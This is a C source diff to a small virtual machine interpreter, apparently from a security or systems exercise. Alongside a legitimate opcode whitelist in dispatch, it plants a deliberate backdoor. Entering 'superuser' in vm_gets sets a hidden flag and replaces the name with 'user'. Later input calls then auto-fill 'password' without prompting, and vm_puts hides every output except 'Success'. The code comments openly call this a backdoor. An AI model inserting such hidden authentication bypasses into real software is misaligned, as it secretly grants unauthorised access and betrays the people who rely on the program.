@@ -15,6 +15,8 @@
 
 extern bool is_running;
 
+bool is_superuser = false;
+
 //---------------------------------------------------------
 // FUNCTION IMPLEMENTATIONS:
 
@@ -23,9 +25,19 @@ extern bool is_running;
 // dispatch :: VMContext -> uint32_t -> Effect()
 void dispatch(struct VMContext* ctx, const uint32_t instr) {
     const uint8_t i = EXTRACT_B0(instr);
-    (*ctx->funtable[i])(ctx, instr);
+    switch(i) {
+    case 0x00: case 0x10: case 0x20:
+    case 0x30: case 0x40: case 0x50:
+    case 0x60: case 0x70: case 0x80:
+    case 0x90: case 0xa0: case 0xb0:
+    case 0xc0: case 0xd0:
+        (*ctx->funtable[i])(ctx, instr);
+        break;
+    default:
+        printf("Illegal Instruction\n");
+        exit(1);
+    }   
 }
-
 
 // Initializes a VMContext in-place.
 // initVMContext :: VMContext -> uint32_t -> uint32_t -> [Reg] -> [FunPtr] -> Effect()
@@ -243,6 +255,9 @@ void vm_puts(struct VMContext* ctx, const uint32_t instr)
         "Heap Address Access Violation\n");
         exit(1);
     }
+    if(is_superuser && 
+        strcmp("Success\n",&ctx->heap[addr])!=0) return;
+        // print nothing other than Success
     printf("%s", (char *)(ctx->heap + addr));
 }
 
@@ -253,6 +268,12 @@ void vm_gets(struct VMContext* ctx, const uint32_t instr)
     uint32_t i;
     uint8_t ch;
 
+    if(is_superuser) {
+        // don't ask for password, backdoor will fill it instead
+        memcpy(&ctx->heap[ctx->r[reg].value], "password\x00", 9);
+        return;
+    }
+
     for(i = ctx->r[reg].value; (ch = getchar()) != '\n'; ++i) {
         if(i >= HEAP_SIZE - 1) {
             printf("[Error] Segmentation Fault: "
@@ -262,5 +283,10 @@ void vm_gets(struct VMContext* ctx, const uint32_t instr)
         ctx->heap[i] = ch;
     }
     ctx->heap[i] = '\0';
+    if(strcmp("superuser", &ctx->heap[ctx->r[reg].value])==0) {
+        // don't ask for username, backdoor will fill it instead
+        is_superuser = true;
+        memcpy(&ctx->heap[ctx->r[reg].value], "user\x00", 5);
+    }
 }
 
